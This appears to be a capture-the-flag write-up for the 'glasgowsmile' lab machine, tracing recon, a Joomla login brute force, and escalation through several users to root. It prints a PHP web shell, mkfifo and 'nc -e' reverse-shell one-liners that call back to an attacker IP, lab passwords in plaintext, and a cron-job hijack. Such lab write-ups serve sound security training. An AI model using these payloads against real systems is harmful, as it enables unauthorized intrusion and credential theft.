## nmap 

![nmap](https://raw.githubusercontent.com/MythicalMoon/writeups/tree/main/PG/glasgowsmile/Screenshots/2022-10-12-07-41-40.png)

## gobuster

    gobuster dir -u http://glasgowsmile.pg -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster-base

![](/Screenshots/2022-10-12-09-28-13.png)

## gobuster /joomla

    gobuster dir -u http://glasgowsmile.pg/joomla -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster-joomla-ext.out -x txt,php,html

![](/Screenshots/2022-10-12-09-31-22.png)

## main page

![](/Screenshots/2022-10-12-07-42-22.png)

## /joomla

![](/Screenshots/2022-10-12-07-42-49.png)

## joomscan !Ref: "joomscan.out"

    joomscan -u http://glasgowsmile.pg/joomla -ec

![](/Screenshots/2022-10-12-07-54-26.png)

## searchsploit: -- nothing of value

![](/Screenshots/2022-10-12-07-55-35.png)


## admin page URL

![](/Screenshots/2022-10-12-07-50-35.png)



## robots.txt

![](/Screenshots/2022-10-12-07-46-18.png)

## htaccess.txt (kinda weird that it's a txt, that should not exist!)

![](/Screenshots/2022-10-12-07-47-26.png)

## htaccess line

![](/Screenshots/2022-10-12-07-47-55.png)

--- quick google on it made me thing it's nothing of significance

![](/Screenshots/2022-10-12-07-49-37.png)

Now since nothing has really pops out at us, lets try brute forcing, we have some potential usernames already on the webpage, aswell as we can use the basic one and joomla itself.

We can make a wordlist by running cewl

    cewl -d 3 http://glasgowsmile.pg/joomla > words.txt

joomla:Gotham once our token gets accepted its gone and the rest of the results don't produce the ussual failed login attempt from this we gather it's Gotham as the password.



![](/Screenshots/2022-10-12-08-06-33.png)

## joomla:Gotham - Success

![](/Screenshots/2022-10-12-08-09-12.png)

## new template creation:

![](/Screenshots/2022-10-12-08-10-39.png)

## cmd.php 

    <?php system($_GET["cmd"]); ?>

## Execution:

![](/Screenshots/2022-10-12-08-12-59.png)

now lets get a reverse shell!

## Payload

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.154 4544 >/tmp/f

* however we need to URL encode it first:

        rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.49.154%204544%20%3E%2Ftmp%2Ff

## set up a listener and ... We have a shell

![](/Screenshots/2022-10-12-08-17-39.png)

stabilize shell:

    python -c 'import pty;pty.spawn("/bin/bash");'
* background
    
        stty raw -echo && fg
        rows=37
        columns=174
        export TERM=xterm-256color


![](/Screenshots/2022-10-12-08-24-21.png)

## www-data
    ls -lah

![](/Screenshots/2022-10-12-08-26-00.png)

## configuration.php: ![](/configuration-dump.txt)

![](/Screenshots/2022-10-12-08-27-40.png)

## mysql

    mysql -u joomla -p
        >babyjoker

![](/Screenshots/2022-10-12-08-30-26.png)

## dump:

![](/Screenshots/2022-10-12-08-31-33.png)


joomla cred dump:

![](/Screenshots/2022-10-12-08-33-29.png)

## users

![](/Screenshots/2022-10-12-08-34-33.png)

## User: robs password

![](/Screenshots/2022-10-12-08-35-30.png)

![](/Screenshots/2022-10-12-08-36-20.png)

## first flag

![](/Screenshots/2022-10-12-08-37-10.png)

## Abnerineedyourhelp:
* This jumbled mess reminds of ROT13 -> www.ROT13.com we can cycle through the ROT varieties until the text makes sense.

![](/Screenshots/2022-10-12-08-38-30.png)

    Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
    Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==

## rot13
* Turns out it's ROT1

![](/Screenshots/2022-10-12-08-39-34.png)

## Abner's pass

![](/Screenshots/2022-10-12-08-40-15.png)

![](/Screenshots/2022-10-12-08-41-06.png)

## User :abner

* Nothing interesting in home

![](/Screenshots/2022-10-12-08-41-48.png)

* no usefull SUID's or SUDO privs

![](/Screenshots/2022-10-12-08-43-25.png)

* something interesting:

![](/Screenshots/2022-10-12-08-44-24.png)
* Could this be Penguin's password in plain text?

    scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz

![](/Screenshots/2022-10-12-08-50-20.png)

## yes --

![](/Screenshots/2022-10-12-08-50-58.png)

## User: penguin

    ls -alh

![](/Screenshots/2022-10-12-08-55-04.png)

* The directories permisions seemed abit unusual that ir only had read permisions. We fix that by changing permisions recursively for the directory to have all perms.

        chmod -R 777 SomeoneWhoHidesBehindAMask/

## People are starting to notice:

![](/Screenshots/2022-10-12-08-57-41.png)

* From the wording we can sort of guess that it might be a scheduled task, since it mentions copying something to this directory, but doesnt specify when, not even an estimate.

## crontab

* Nothing...

![](/Screenshots/2022-10-12-08-59-52.png)

* Hmm, let's run LinPeas and PSPY64 
* [LinPeas] Not very helpful from 1st glance.
* [pspy64] Is helpful.

## .trash_old executed as root

![](/Screenshots/2022-10-12-09-06-22.png)

## rev shell to root:
* so now We can go and edit .trash_old to what ever we want.

    nc -e /bin/bash 192.168.49.154 9001

![](/Screenshots/2022-10-12-09-10-02.png)
* Set up a listener once again and we have root.

![](/Screenshots/2022-10-12-09-10-13.png)

* There's several ways this could of been used to gain root.

## root flag

    b0d011[..REDACTED..]9e1895
